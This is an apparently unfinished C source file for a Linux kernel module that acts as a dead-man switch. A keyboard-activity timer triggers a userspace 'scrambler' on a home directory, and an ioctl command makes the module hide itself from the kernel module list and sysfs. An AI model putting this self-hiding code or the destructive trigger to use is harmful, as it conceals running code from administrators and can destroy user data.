#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include "af_common.h"

// Mouse:
#include <linux/keyboard.h>
#include <linux/jiffies.h>
#include <linux/timer.h>

// Userspace-helper:
#include <linux/kmod.h>


MODULE_LICENSE("GPL");

/*  armed 0: disarmed. default 
    armed 1: armed.         */
int armed = 0;

int hidden = 0;
static struct timer_list countdown_timer;

static struct list_head *modlist; // Declare pointer to empty linked list, courtesy of kernel dev
static struct kobject *kobject_parent;


static int call_scrambler(void) {
	// struct subprocess_info *sub_info;
	/*
	char *args[] = {"/usr/bin/scrambler", "/home/bob/files", NULL};
	static char *envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/bin:/usr/sbin",
		NULL
	};
	// sub_info = call_usermodehelper_setup(args[0], args, envp, GFP_ATOMIC, NULL, NULL, NULL);
	// if (sub_info == NULL){
	// 	printk(KERN_DEBUG "sub_info is NULL...");
	// } else {
	// 	printk(KERN_DEBUG "sub_info: %lx", sub_info);
	// }
	// return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
	// return call_usermodehelper(args[0], args, envp, UMH_WAIT_PROC);
	// return 0;
	*/
	printk(KERN_INFO "call_scrambler called...\n");
	char * envp[] = { "HOME=/", NULL };
	char * argv[] = { "/usr/bin/touch", "/home/bob/touched", NULL };

	
    int res;
    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    
    // res = call_usermodehelper( argv[0], argv, envp, UMH_WAIT_PROC );
    printk(KERN_INFO "umh call result: %i\n", res);
    return 0;
    
    // return 0;
}


// Structs to save info

// whats going on here...?
static void hide_me(void) {
	if (hidden) return;

	printk(KERN_INFO "BEFORE DELETE ------");
	printk(KERN_INFO "list.prev: %lx\n", &THIS_MODULE->list.prev);
	printk(KERN_INFO "mkobkj.kobj: %lx\n", &THIS_MODULE->mkobj.kobj);

	modlist = THIS_MODULE->list.prev; // THIS_MODULE is macro that refers to current module, similar to self (?)
	list_del(&THIS_MODULE->list); // Assuming that THIS_MODULE has a property "list" which is it's sys entry.. (?)

	kobject_parent = THIS_MODULE->mkobj.kobj.parent;
	kobject_del(&THIS_MODULE->mkobj.kobj);  // Unlink kobj "from hierarchy".  These 2 lines alone seem to hide if very effectively...

	// lets get some info about what we're deleting:
	// printk(KERN_DEBUG "af_force: THIS_MODULE->sect_attrs = %s\n", typeof(THIS_MODULE->sect_attrs));
	// printk(KERN_DEBUG "af_force: THIS_MODULE->notes_attrs = %s\n", typeof(THIS_MODULE->notes_attrs));

	// THIS_MODULE->sect_attrs = NULL;
	// THIS_MODULE->notes_attrs = NULL;
	hidden=1;
}

static void unhide_me(void) {
	int r;
	if (hidden == 0) return;
	list_add(&THIS_MODULE->list, modlist); // opposite of list_del

	if ((r = kobject_add(&THIS_MODULE->mkobj.kobj, kobject_parent, "rt")) < 0) {
		printk(KERN_ALERT "Error restoring kobject!\n");
	} else {
		printk(KERN_INFO "kobject_add result: %i\n", r);
	}

	printk(KERN_INFO "AFTER RESTORE ------");
	printk(KERN_INFO "list.prev: %lx\n", &THIS_MODULE->list.prev);
	printk(KERN_INFO "mkobkj.kobj: %lx\n", &THIS_MODULE->mkobj.kobj);


	// kobject_add(&THIS_MODULE->mkobj.kobj, modlist->mkobj.kobj);
	hidden = 0;
}

static int device_open(struct inode *inode, struct file *file)
{
    // printk(KERN_INFO "af_force: file Opened");
    return 0;
}

int key_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    int ret = NOTIFY_OK;

    if (code == KBD_KEYCODE) {
        if(param->down){
            mod_timer(&countdown_timer, jiffies + 5 * HZ);
            // printk(KERN_DEBUG "af_force: Resetting timer\n");
        }        
    }
    return ret;
}

// Correct sig:
// long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
static long device_ioctl(struct file *filp, unsigned int cmd, unsigned long args)
{
    char *msg = (char *)args;
    switch(cmd)
    {   
        case IOCTL_CMD:
            printk(KERN_INFO "af_force: got msg %s\n", (char *)args);

            // Arm/Disarm & Hide/Unhide Logic:
            // strcmp 0 is match
            // printk("strcmp result: %i\n", strcmp(msg, "arm"));
            if (strcmp(msg, "arm") == 0) {
                // arm
                printk(KERN_INFO "af_force: arming...\n");
                armed = 1;

            } else if (strcmp(msg, "disarm") == 0) {
                // disarm
                printk(KERN_INFO "af_force: disarming...\n");
                armed = 0;

            } else if (strcmp(msg, "hide") == 0) {
                // disarm
                printk(KERN_INFO "af_force: hiding...\n");
                hide_me();

            } else if (strcmp(msg, "unhide") == 0) {
                // disarm
                printk(KERN_INFO "af_force: unhiding...\n");
                unhide_me();
            }
            break;
    }
    return 0;
}

void detonate (unsigned long data)
{
	// int res;
    if (armed == 1 ) {
        printk(KERN_DEBUG "af_force: Kaboom!\n");
        call_scrambler();
        // printk(KERN_DEBUG "uesrmodehelper_exec result: %i", res);
    } else {
        printk(KERN_DEBUG "af_force: It's quiet...\n"); 
    }
}

static int device_release(struct inode *inode, struct file *file)
{
    // printk(KERN_INFO "af_force: file Released");
    return 0;
}

static struct notifier_block nb = {
    .notifier_call = key_notify
};

static struct class *my_class;

static struct file_operations fops={
    .open = device_open,
    .release = device_release,
    .unlocked_ioctl = device_ioctl
};

static int hello_init(void)
{   
    // Module Registration:
    major_no = register_chrdev(0, DEVICE_NAME, &fops);
    printk(KERN_INFO "af_force: Major_no is %d\n", major_no);

    my_class = class_create(THIS_MODULE, DEVICE_NAME);
    device_create(my_class, NULL, MKDEV(major_no,0), NULL, DEVICE_NAME);
    printk(KERN_INFO "af_force: Device Initialized in kernel.\n");

    // Timer setup:
    setup_timer(&countdown_timer, detonate, 0);
    mod_timer(&countdown_timer, jiffies + 5 * HZ);   
    printk( "af_force: Starting timer to fire in 5s (%ld)\n", jiffies );

    register_keyboard_notifier(&nb);
    return 0;
}




static void hello_exit(void)
{
    // Timer Deconstruction:
    del_timer(&countdown_timer);
    unregister_keyboard_notifier(&nb);

    // Module Deregistration:
    device_destroy(my_class,MKDEV(major_no,0));
    class_unregister(my_class);
    class_destroy(my_class);
    unregister_chrdev(major_no, DEVICE_NAME);
    printk(KERN_INFO "af_force: Closed & Unregistered.\n");
}



module_init(hello_init);
module_exit(hello_exit);